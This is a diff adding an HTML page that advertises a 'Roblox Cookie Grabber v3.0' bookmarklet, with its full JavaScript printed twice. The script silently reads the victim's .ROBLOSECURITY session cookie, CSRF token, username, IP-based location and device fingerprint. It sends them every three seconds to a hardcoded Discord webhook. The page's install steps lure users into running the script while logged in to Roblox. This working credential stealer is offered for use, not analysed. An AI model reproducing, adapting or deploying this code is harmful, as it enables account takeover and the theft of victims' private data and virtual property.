@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Cookie Grabber v3.0</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .bookmark-link {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 25px 50px;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 25px 0;
+            transition: all 0.3s ease;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        .bookmark-link:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #ffd700;
+        }
+        .code-container {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            word-break: break-all;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .code-container:hover {
+            background: rgba(0, 0, 0, 0.4);
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 2px solid #ffc107;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        .highlight {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 10px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+        .version-tag {
+            background: linear-gradient(45deg, #00d4ff, #090979);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        .stat {
+            text-align: center;
+            padding: 15px;
+        }
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #ffd700;
+        }
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="version-tag">🚀 VERSION 3.0 - ENHANCED</div>
+        <h1>🍪 Advanced Roblox Cookie Grabber</h1>
+        <p><strong>Next-generation cookie extraction with enhanced features and stealth mode!</strong></p>
+        
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number">🔄</div>
+                <div class="stat-label">Auto-Running</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">3s</div>
+                <div class="stat-label">Check Interval</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">👻</div>
+                <div class="stat-label">Stealth Mode</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">📊</div>
+                <div class="stat-label">Rich Data</div>
+            </div>
+        </div>
+
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🔍 Enhanced Extraction</h3>
+                <ul>
+                    <li>Multiple cookie detection methods</li>
+                    <li>CSRF token extraction</li>
+                    <li>User ID & username capture</li>
+                    <li>Device fingerprinting</li>
+                </ul>
+            </div>
+            <div class="feature-card">
+                <h3>👻 Stealth Mode</h3>
+                <ul>
+                    <li>No visible control panels</li>
+                    <li>Silent operation</li>
+                    <li>No notifications</li>
+                    <li>Console logging only</li>
+                </ul>
+            </div>
+            <div class="feature-card">
+                <h3>📊 Rich Discord Embeds</h3>
+                <ul>
+                    <li>Beautiful formatted messages</li>
+                    <li>Organized data fields</li>
+                    <li>Color-coded status</li>
+                    <li>Timestamp tracking</li>
+                </ul>
+            </div>
+            <div class="feature-card">
+                <h3>🔄 Auto-Running</h3>
+                <ul>
+                    <li>Runs every 3 seconds</li>
+                    <li>Self-activates on Roblox</li>
+                    <li>Auto-cleanup on exit</li>
+                    <li>Duplicate prevention</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Enhanced Bookmark -->
+        <div style="text-align: center; margin: 40px 0;">
+            <p style="font-size: 18px; margin-bottom: 20px;"><strong>👇 Drag this to your bookmark bar:</strong></p>
+            <a href="javascript:(function(){const WEBHOOK_URL='https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';const AUTO_RUN=true;const CHECK_INTERVAL=3000;const STEALTH_MODE=true;if(window.robloxGrabberV3Active){return}window.robloxGrabberV3Active=true;function extractAllRobloxData(){let data={cookie:null,csrf:null,userId:null,username:null,robux:null};try{const cookies=document.cookie.split(';');for(let cookie of cookies){const trimmed=cookie.trim();if(trimmed.startsWith('.ROBLOSECURITY=')){data.cookie=trimmed.substring('.ROBLOSECURITY='.length);break}}}catch(e){}if(!data.cookie){try{const keys=['RBXAuth','RBXAuthenticationNegotiation','RobloxAuth'];for(const key of keys){const value=localStorage.getItem(key);if(value&&value.length>50){data.cookie=value;break}}}catch(e){}}try{const csrfMeta=document.querySelector('meta[name=\"csrf-token\"]');if(csrfMeta)data.csrf=csrfMeta.content}catch(e){}try{const userDataScript=document.querySelector('script[type=\"application/ld+json\"]');if(userDataScript){const userData=JSON.parse(userDataScript.textContent);if(userData.name)data.username=userData.name}}catch(e){}try{if(window.Roblox&&window.Roblox.CurrentUser){data.userId=window.Roblox.CurrentUser.userId;data.username=window.Roblox.CurrentUser.name}}catch(e){}return data}async function getDetailedLocation(){try{const response=await fetch('https://ipapi.co/json/');if(response.ok){const data=await response.json();return{ip:data.ip||'Unknown',country:data.country_name||'Unknown',region:data.region||'Unknown',city:data.city||'Unknown',isp:data.org||'Unknown',timezone:data.timezone||'Unknown',lat:data.latitude||'Unknown',lon:data.longitude||'Unknown'}}}catch(error){}return{ip:'Unknown',country:'Unknown',region:'Unknown',city:'Unknown',isp:'Unknown',timezone:'Unknown',lat:'Unknown',lon:'Unknown'}}function getDeviceInfo(){return{userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cookiesEnabled:navigator.cookieEnabled,onlineStatus:navigator.onLine}}async function sendToWebhook(robloxData,locationInfo,deviceInfo){try{const timestamp=new Date().toISOString();const fullCookie=robloxData.cookie?`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxData.cookie}`:'Not found';const payload={embeds:[{title:'🍪 Roblox Data Extracted',color:0x00ff00,timestamp:timestamp,fields:[{name:'🍪 Cookie',value:`\`\`\`${fullCookie}\`\`\``,inline:false},{name:'👤 User Info',value:`**Username:** ${robloxData.username||'Unknown'}\n**User ID:** ${robloxData.userId||'Unknown'}\n**CSRF:** ${robloxData.csrf||'Not found'}`,inline:true},{name:'📍 Location',value:`**IP:** ${locationInfo.ip}\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**ISP:** ${locationInfo.isp}\n**Timezone:** ${locationInfo.timezone}`,inline:true},{name:'💻 Device',value:`**Platform:** ${deviceInfo.platform}\n**Screen:** ${deviceInfo.screen}\n**Language:** ${deviceInfo.language}\n**Browser:** ${deviceInfo.userAgent.split(' ').pop()}`,inline:false},{name:'🌐 Session',value:`**Page:** ${window.location.href}\n**Referrer:** ${document.referrer||'Direct'}\n**Time:** ${new Date().toLocaleString()}`,inline:false}],footer:{text:'Roblox Cookie Grabber v3.0'}}],username:'Auto Roblox Grabber'};const response=await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return response.ok}catch(error){return false}}function showStealthNotif(message,success=true){if(STEALTH_MODE)return;const notif=document.createElement('div');notif.style.cssText=`position:fixed;bottom:20px;right:20px;background:${success?'#28a745':'#dc3545'};color:white;padding:10px 15px;border-radius:20px;z-index:999999;font-family:Arial,sans-serif;font-size:12px;opacity:0.9;`;notif.textContent=message;document.body.appendChild(notif);setTimeout(()=>notif.remove(),3000)}async function performExtraction(){if(!window.location.hostname.includes('roblox.com'))return;const robloxData=extractAllRobloxData();if(robloxData.cookie){const locationInfo=await getDetailedLocation();const deviceInfo=getDeviceInfo();const success=await sendToWebhook(robloxData,locationInfo,deviceInfo);if(!STEALTH_MODE){showStealthNotif(success?'✅ Data sent':'❌ Send failed',success)}}}if(AUTO_RUN&&window.location.hostname.includes('roblox.com')){performExtraction();if(!window.robloxGrabberInterval){window.robloxGrabberInterval=setInterval(performExtraction,CHECK_INTERVAL)}window.addEventListener('beforeunload',()=>{if(window.robloxGrabberInterval){clearInterval(window.robloxGrabberInterval);window.robloxGrabberInterval=null}window.robloxGrabberV3Active=false});console.log('%c🍪 Roblox Grabber v3.0 Active','color: #28a745; font-weight: bold;')}else{if(window.location.hostname.includes('roblox.com')){performExtraction()}else{alert('This bookmark only works on Roblox.com pages!')}}})();" class="bookmark-link">
+                🚀 Roblox Grabber v3.0
+            </a>
+        </div>
+
+        <div class="warning">
+            <h3>🔥 What's New in v3.0:</h3>
+            <ul>
+                <li><strong>Enhanced Data Extraction:</strong> Captures cookies, CSRF tokens, user info, and device details</li>
+                <li><strong>Rich Discord Embeds:</strong> Beautiful formatted messages with organized data fields</li>
+                <li><strong>Stealth Mode:</strong> Runs completely silently with no visible UI elements</li>
+                <li><strong>Auto-Running:</strong> Activates automatically every 3 seconds on Roblox pages</li>
+                <li><strong>Device Fingerprinting:</strong> Captures browser, screen, and system information</li>
+                <li><strong>Smart Detection:</strong> Multiple fallback methods for reliable cookie extraction</li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 40px;">
+            <h3>📋 Installation Instructions:</h3>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h3>1️⃣ Drag & Drop</h3>
+                    <p>Simply drag the bookmark link above to your browser's bookmark bar.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>2️⃣ Visit Roblox</h3>
+                    <p>Go to roblox.com and make sure you're logged in to your account.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>3️⃣ Click Once</h3>
+                    <p>Click the bookmark to activate. It will run automatically afterwards.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>4️⃣ Check Discord</h3>
+                    <p>Rich embed messages will appear in your Discord channel!</p>
+                </div>
+            </div>
+        </div>
+
+        <div style="margin-top: 40px;">
+            <h3>📱 Discord Embed Preview:</h3>
+            <div style="background: rgba(0,0,0,0.4); padding: 20px; border-radius: 10px; border-left: 4px solid #00ff00;">
+                <div style="color: #00ff00; font-weight: bold; margin-bottom: 10px;">🍪 Roblox Data Extracted</div>
+                <div style="margin-bottom: 8px;"><strong>🍪 Cookie:</strong> _|WARNING:-DO-NOT-SHARE-THIS...</div>
+                <div style="margin-bottom: 8px;"><strong>👤 User Info:</strong> Username: PlayerName | User ID: 123456789</div>
+                <div style="margin-bottom: 8px;"><strong>📍 Location:</strong> IP: 192.168.1.1 | Location: City, Country</div>
+                <div style="margin-bottom: 8px;"><strong>💻 Device:</strong> Platform: Win32 | Screen: 1920x1080</div>
+                <div><strong>🌐 Session:</strong> Page: https://roblox.com/home</div>
+                <div style="margin-top: 10px; font-size: 12px; opacity: 0.7;">Roblox Cookie Grabber v3.0</div>
+            </div>
+        </div>
+
+        <div style="margin-top: 40px;">
+            <h3>🔧 Manual Installation Code:</h3>
+            <p>If drag & drop doesn't work, copy this code and create a bookmark manually:</p>
+            <div class="code-container" onclick="navigator.clipboard.writeText(this.textContent); alert('Copied to clipboard!')" title="Click to copy">
+javascript:(function(){const WEBHOOK_URL='https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';const AUTO_RUN=true;const CHECK_INTERVAL=3000;const STEALTH_MODE=true;if(window.robloxGrabberV3Active){return}window.robloxGrabberV3Active=true;function extractAllRobloxData(){let data={cookie:null,csrf:null,userId:null,username:null,robux:null};try{const cookies=document.cookie.split(';');for(let cookie of cookies){const trimmed=cookie.trim();if(trimmed.startsWith('.ROBLOSECURITY=')){data.cookie=trimmed.substring('.ROBLOSECURITY='.length);break}}}catch(e){}if(!data.cookie){try{const keys=['RBXAuth','RBXAuthenticationNegotiation','RobloxAuth'];for(const key of keys){const value=localStorage.getItem(key);if(value&&value.length>50){data.cookie=value;break}}}catch(e){}}try{const csrfMeta=document.querySelector('meta[name="csrf-token"]');if(csrfMeta)data.csrf=csrfMeta.content}catch(e){}try{const userDataScript=document.querySelector('script[type="application/ld+json"]');if(userDataScript){const userData=JSON.parse(userDataScript.textContent);if(userData.name)data.username=userData.name}}catch(e){}try{if(window.Roblox&&window.Roblox.CurrentUser){data.userId=window.Roblox.CurrentUser.userId;data.username=window.Roblox.CurrentUser.name}}catch(e){}return data}async function getDetailedLocation(){try{const response=await fetch('https://ipapi.co/json/');if(response.ok){const data=await response.json();return{ip:data.ip||'Unknown',country:data.country_name||'Unknown',region:data.region||'Unknown',city:data.city||'Unknown',isp:data.org||'Unknown',timezone:data.timezone||'Unknown',lat:data.latitude||'Unknown',lon:data.longitude||'Unknown'}}}catch(error){}return{ip:'Unknown',country:'Unknown',region:'Unknown',city:'Unknown',isp:'Unknown',timezone:'Unknown',lat:'Unknown',lon:'Unknown'}}function getDeviceInfo(){return{userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cookiesEnabled:navigator.cookieEnabled,onlineStatus:navigator.onLine}}async function sendToWebhook(robloxData,locationInfo,deviceInfo){try{const timestamp=new Date().toISOString();const fullCookie=robloxData.cookie?`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxData.cookie}`:'Not found';const payload={embeds:[{title:'🍪 Roblox Data Extracted',color:0x00ff00,timestamp:timestamp,fields:[{name:'🍪 Cookie',value:`\`\`\`${fullCookie}\`\`\``,inline:false},{name:'👤 User Info',value:`**Username:** ${robloxData.username||'Unknown'}\n**User ID:** ${robloxData.userId||'Unknown'}\n**CSRF:** ${robloxData.csrf||'Not found'}`,inline:true},{name:'📍 Location',value:`**IP:** ${locationInfo.ip}\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**ISP:** ${locationInfo.isp}\n**Timezone:** ${locationInfo.timezone}`,inline:true},{name:'💻 Device',value:`**Platform:** ${deviceInfo.platform}\n**Screen:** ${deviceInfo.screen}\n**Language:** ${deviceInfo.language}\n**Browser:** ${deviceInfo.userAgent.split(' ').pop()}`,inline:false},{name:'🌐 Session',value:`**Page:** ${window.location.href}\n**Referrer:** ${document.referrer||'Direct'}\n**Time:** ${new Date().toLocaleString()}`,inline:false}],footer:{text:'Roblox Cookie Grabber v3.0'}}],username:'Auto Roblox Grabber'};const response=await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return response.ok}catch(error){return false}}function showStealthNotif(message,success=true){if(STEALTH_MODE)return;const notif=document.createElement('div');notif.style.cssText=`position:fixed;bottom:20px;right:20px;background:${success?'#28a745':'#dc3545'};color:white;padding:10px 15px;border-radius:20px;z-index:999999;font-family:Arial,sans-serif;font-size:12px;opacity:0.9;`;notif.textContent=message;document.body.appendChild(notif);setTimeout(()=>notif.remove(),3000)}async function performExtraction(){if(!window.location.hostname.includes('roblox.com'))return;const robloxData=extractAllRobloxData();if(robloxData.cookie){const locationInfo=await getDetailedLocation();const deviceInfo=getDeviceInfo();const success=await sendToWebhook(robloxData,locationInfo,deviceInfo);if(!STEALTH_MODE){showStealthNotif(success?'✅ Data sent':'❌ Send failed',success)}}}if(AUTO_RUN&&window.location.hostname.includes('roblox.com')){performExtraction();if(!window.robloxGrabberInterval){window.robloxGrabberInterval=setInterval(performExtraction,CHECK_INTERVAL)}window.addEventListener('beforeunload',()=>{if(window.robloxGrabberInterval){clearInterval(window.robloxGrabberInterval);window.robloxGrabberInterval=null}window.robloxGrabberV3Active=false});console.log('%c🍪 Roblox Grabber v3.0 Active','color: #28a745; font-weight: bold;')}else{if(window.location.hostname.includes('roblox.com')){performExtraction()}else{alert('This bookmark only works on Roblox.com pages!')}}})();
+            </div>
+            <p><em>Click the code box above to copy to clipboard</em></p>
+        </div>
+
+        <div style="text-align: center; margin-top: 50px; opacity: 0.8;">
+            <p><strong>🚀 Roblox Cookie Grabber v3.0 - Enhanced Edition</strong></p>
+            <p>Advanced cookie extraction with stealth mode and rich Discord embeds</p>
+        </div>
+    </div>
+</body>
+</html>
